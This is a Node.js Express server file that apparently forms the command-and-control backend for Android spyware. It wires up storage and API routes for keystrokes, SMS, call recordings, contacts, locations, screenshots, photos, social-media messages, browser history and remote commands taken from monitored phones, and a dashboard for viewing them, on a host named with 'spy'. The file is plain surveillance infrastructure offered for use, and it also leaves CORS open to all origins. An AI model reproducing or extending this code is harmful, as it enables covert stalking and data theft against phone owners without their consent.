const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const dotenv = require('dotenv');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');

dotenv.config();

const app = express();
const server = http.createServer(app);

// Socket.io
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// ========== MIDDLEWARE ==========
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Serve static frontend files
const frontendPath = path.join(__dirname, '../frontend');
console.log('📁 Serving static files from:', frontendPath);
app.use(express.static(frontendPath));

// ========== ENV CHECK ==========
console.log("\n📋 Render Deployment Check:");
console.log("🔑 MONGODB_URI:", process.env.MONGODB_URI ? "Loaded ✅" : "Missing ❌");
console.log("🌍 NODE_ENV:", process.env.NODE_ENV || "production");
console.log("🔌 PORT:", process.env.PORT || 5000);

// ========== DATABASE CONNECTION ==========
const mongoURI = process.env.MONGODB_URI;

if (!mongoURI) {
  console.error("❌ FATAL: MONGODB_URI not set in environment variables");
}

mongoose.connect(mongoURI, {
  serverSelectionTimeoutMS: 15000,
  socketTimeoutMS: 45000,
})
.then(() => {
  console.log('✅ MongoDB Atlas connected successfully');
})
.catch(err => {
  console.error('❌ MongoDB Connection Error:', err.message);
});

mongoose.connection.on('connected', () => {
  console.log('🟢 MongoDB connected');
});

mongoose.connection.on('error', (err) => {
  console.log('🔴 MongoDB error:', err.message);
});

// ========== IMPORT MODELS ==========
require('./models/Device');
require('./models/CallLog');
require('./models/Sms');
require('./models/Contact');
require('./models/Location');
require('./models/Keylog');
require('./models/AppUsage');
require('./models/Screenshot');
require('./models/Photo');
require('./models/Command');
require('./models/SocialMessage');
require('./models/Notification');
require('./models/BrowserHistory');
require('./models/KeywordAlert');
require('./models/Geofence');
require('./models/CallRecording');

// ========== IMPORT ROUTES ==========
const deviceRoutes = require('./routes/deviceRoutes');
const callRoutes = require('./routes/callRoutes');
const messageRoutes = require('./routes/messageRoutes');
const contactRoutes = require('./routes/contactRoutes');
const locationRoutes = require('./routes/locationRoutes');
const keylogRoutes = require('./routes/keylogRoutes');
const appUsageRoutes = require('./routes/appUsageRoutes');
const screenshotRoutes = require('./routes/screenshotRoutes');
const photoRoutes = require('./routes/photoRoutes');
const socialRoutes = require('./routes/socialRoutes');
const notificationRoutes = require('./routes/notificationRoutes');
const browserRoutes = require('./routes/browserRoutes');
const commandRoutes = require('./routes/commandRoutes');
const authRoutes = require('./routes/authRoutes');
const dashboardRoutes = require('./routes/dashboardRoutes');

// ========== USE ROUTES ==========
app.use('/api', deviceRoutes);
app.use('/api', callRoutes);
app.use('/api', messageRoutes);
app.use('/api', contactRoutes);
app.use('/api', locationRoutes);
app.use('/api', keylogRoutes);
app.use('/api', appUsageRoutes);
app.use('/api', screenshotRoutes);
app.use('/api', photoRoutes);
app.use('/api', socialRoutes);
app.use('/api', notificationRoutes);
app.use('/api', browserRoutes);
app.use('/api', commandRoutes);
app.use('/api/auth', authRoutes);
app.use('/api/data', dashboardRoutes);

// Health check
app.get('/api/health', (req, res) => {
  const dbStatus = mongoose.connection.readyState;
  const statusMap = { 0: 'disconnected', 1: 'connected', 2: 'connecting', 3: 'disconnecting' };
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    mongodb: statusMap[dbStatus] || 'unknown',
    server: 'render'
  });
});

// Catch-all to serve index.html
app.get('*', (req, res) => {
  if (req.originalUrl.startsWith('/api')) {
    return res.status(404).json({ error: 'API endpoint not found' });
  }
  res.sendFile(path.join(frontendPath, 'index.html'));
});

// Socket.io
io.on('connection', (socket) => {
  console.log('🔌 Client connected:', socket.id);
  socket.on('disconnect', () => {
    console.log('❌ Client disconnected:', socket.id);
  });
});

// Start server
const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
 console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📡 Android API base: https://gauravhanna-spy.onrender.com/api/client`);
  console.log(`📡 Dashboard API base: https://gauravhanna-spy.onrender.com/api/data`);
});